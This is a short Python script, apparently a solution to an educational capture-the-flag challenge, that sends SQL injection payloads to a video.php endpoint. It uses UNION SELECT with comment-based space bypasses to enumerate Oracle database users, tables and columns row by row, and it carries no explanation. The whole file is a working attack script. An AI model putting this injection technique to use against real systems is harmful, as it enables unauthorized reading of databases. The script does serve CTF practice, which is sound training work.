# importing the requests library 

import requests 
  
# api-endpoint 
colName = []


# URL = "https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,USERNAME,null/**/from/**/all_users"

# URL = "https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,username,null/**/from/**/(SELECT/**/ROWNUM/**/r,username/**/FROM/**/all_users/**/ORDER/**/BY/**/username)/**/where/**/r="

# URL = "https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/all_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r="

URL = "https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/all_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r="

for i in range(500):

    r = requests.get(url = URL + str(i), verify=False) 
  
# data = r.status_code
    output = r.text.splitlines()[69]

    print("\n" + URL + str(i))
# print(data)
    print(output + "\n")


